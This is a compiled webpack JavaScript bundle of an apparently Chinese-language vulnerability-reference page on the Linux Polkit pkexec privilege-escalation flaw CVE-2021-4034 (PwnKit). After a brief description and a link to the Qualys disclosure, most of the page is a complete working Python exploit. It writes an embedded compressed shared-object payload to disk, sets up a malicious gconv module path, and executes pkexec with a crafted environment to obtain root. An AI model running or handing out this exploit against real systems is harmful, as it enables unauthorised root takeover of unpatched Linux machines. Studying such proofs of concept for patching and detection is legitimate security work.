(window.webpackJsonp=window.webpackJsonp||[]).push([[582],{1948:function(s,t,a){s.exports=a.p+"assets/img/1643169088060-acd8be41-bd7e-47a5-bdea-c03956a1a35f.21d99a8f.png"},3109:function(s,t,a){"use strict";a.r(t);var n=a(64),r=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"linux-polkit权限提升漏洞-cve-2021-4034"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#linux-polkit权限提升漏洞-cve-2021-4034"}},[s._v("#")]),s._v(" Linux Polkit权限提升漏洞 CVE-2021-4034")]),s._v(" "),t("h2",{attrs:{id:"漏洞描述"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),t("p",[s._v("Qualys 研究团队在 polkit 的 pkexec 中发现了一个内存损坏漏洞，该 SUID 根程序默认安装在每个主要的 Linux 发行版上。这个易于利用的漏洞允许任何非特权用户通过在其默认配置中利用此漏洞来获得易受攻击主机上的完全 root 权限。")]),s._v(" "),t("h2",{attrs:{id:"漏洞影响"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),t("a-checkbox",{attrs:{checked:""}},[s._v("Polkit > 2009")]),s._v(" "),t("h2",{attrs:{id:"漏洞复现"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),t("a-alert",{attrs:{type:"success",message:"POC来源: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034",description:"",showIcon:""}}),s._v(" "),t("br"),s._v(" "),t("p",[t("img",{attrs:{src:a(1948),alt:"img"}})]),s._v(" "),t("h2",{attrs:{id:"漏洞poc"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#漏洞poc"}},[s._v("#")]),s._v(" 漏洞POC")]),s._v(" "),t("a-alert",{attrs:{type:"success",message:"https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py",description:"",showIcon:""}}),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#!/usr/bin/env python3")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# hardcoded amd64 lib")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" ctypes "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" ctypes"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("util "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" find_library\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" os\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" zlib\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" base64\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" tempfile\n\npayload "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" zlib"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("decompress"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n    base64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("b64decode"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n        "),t("span",{pre:!0,attrs:{class:"token triple-quoted-string string"}},[s._v('"""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"""')]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nlibc "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" CDLL"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("find_library"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"c"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nlibc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("execve"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("argtypes "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" c_char_p"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" POINTER"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("c_char_p"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" POINTER"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("c_char_p"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nlibc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("execve"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("restype "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" c_ssize_t\n\nwd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" tempfile"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("mkdtemp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("open")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("wd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/pwn.so"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"wb"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("write"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nos"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("mkdir"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("wd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/gconv/"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("open")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("wd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/gconv/gconv-modules"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"w"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("write"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"module  UTF-8//    INTERNAL    ../pwn    2"')]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nos"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("mkdir"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("wd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/GCONV_PATH=."')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nos"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("mknod"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("wd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/GCONV_PATH=./gconv"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nos"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("chmod"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("wd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/GCONV_PATH=."')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0o777")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nos"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("chmod"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("wd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/GCONV_PATH=./gconv"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0o777")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nos"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("chmod"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("wd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/pwn.so"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0o777")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nos"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("chdir"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("wd"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ncmd "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('b"/usr/bin/pkexec"')]),s._v("\nargv "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nenvp "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('b"gconv"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('b"PATH=GCONV_PATH=."')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('b"LC_MESSAGES=en_US.UTF-8"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('b"XAUTHORITY=../gconv"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('b""')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\ncargv "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("c_char_p "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("len")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("argv"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("argv"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("None")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ncenv "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("c_char_p "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("len")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("envp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("envp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("None")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nlibc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("execve"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("cmd"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" cargv"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" cenv"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br"),t("span",{staticClass:"line-number"},[s._v("31")]),t("br"),t("span",{staticClass:"line-number"},[s._v("32")]),t("br"),t("span",{staticClass:"line-number"},[s._v("33")]),t("br"),t("span",{staticClass:"line-number"},[s._v("34")]),t("br"),t("span",{staticClass:"line-number"},[s._v("35")]),t("br"),t("span",{staticClass:"line-number"},[s._v("36")]),t("br"),t("span",{staticClass:"line-number"},[s._v("37")]),t("br"),t("span",{staticClass:"line-number"},[s._v("38")]),t("br"),t("span",{staticClass:"line-number"},[s._v("39")]),t("br"),t("span",{staticClass:"line-number"},[s._v("40")]),t("br"),t("span",{staticClass:"line-number"},[s._v("41")]),t("br"),t("span",{staticClass:"line-number"},[s._v("42")]),t("br"),t("span",{staticClass:"line-number"},[s._v("43")]),t("br"),t("span",{staticClass:"line-number"},[s._v("44")]),t("br"),t("span",{staticClass:"line-number"},[s._v("45")]),t("br")])])],1)}),[],!1,null,null,null);t.default=r.exports}}]);